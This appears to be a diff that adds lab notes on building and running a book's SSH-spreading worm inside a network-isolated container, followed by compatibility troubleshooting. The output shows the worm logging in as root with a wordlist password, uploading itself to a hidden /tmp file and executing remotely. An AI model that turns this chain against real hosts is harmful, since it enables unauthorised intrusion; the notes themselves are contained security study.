@@ -1,0 +1,39 @@
+Chapter 13: the worm works -- full chain observed, contained on loopback
+
+$ cargo build --release -p agent          # 1m02s, 3205312 bytes
+
+CONTAINMENT (read spread.rs first: the worm needs a HOST:PORT argument --
+it does not scan, discover, or self-propagate):
+  --network none              only loopback is reachable
+  --cap-drop=ALL              no capabilities
+  --security-opt no-new-privileges
+  --pids-limit 256            no volume mounts, root password = 'password'
+                              (the book's own wordlist entry)
+  SSH server lives INSIDE the same container
+
+$ ./agent 127.0.0.1:22
+Installing into /root/.local/share/bhr_ch13
+bundle.zip found, extracting it to /root/.local/share/bhr_ch13
+spreading to 127.0.0.1:22
+Authenticated! username: (root), password: (password)
+detected platform: linux_x86_64
+Uploading: /root/.local/share/bhr_ch13/agent.linux_x86_64
+size: 3205312
+agent uploaded to /tmp/.goRbZpDEWQGjLWtN0BVU8CoEP1M97C4L
+Agent successfully executed on remote host 🥳        <- upload + remote exec
+
+THE FINDING NOT IN THE BOOK: a 2021 crypto stack vs a current OpenSSH
+  sshd -d shows the client does connect: compat_banner: no match: libssh2_1.9.0_DEV
+  sshd -T confirms ssh-rsa offered and every legacy KEX accepted
+  a real ssh client completes every one of those handshakes
+  the agent still fails:  Ssh(Session(-1)) "Unable to exchange encryption keys"
+  => ssh2 0.9 / libssh2 cannot reliably talk to OpenSSH 9.6
+
+BLOCKERS:
+  ubuntu:20.04 cannot run it: needs GLIBC_2.32/2.33/2.34/2.38, 20.04 has 2.31
+  musl target (the Makefile's) fails to link vendored openssl/libssh2
+  'KexAlgorithms +...,ECDH-SHA2-NISTP256' -- one bad entry kills the whole
+     directive and sshd refuses to start (real name is lowercase)
+
+FLAKY, NOT UNDERSTOOD: 6/6 successes in one sequence, failures adjacent with an
+equivalent command. Cause not identified. Reported as observed.
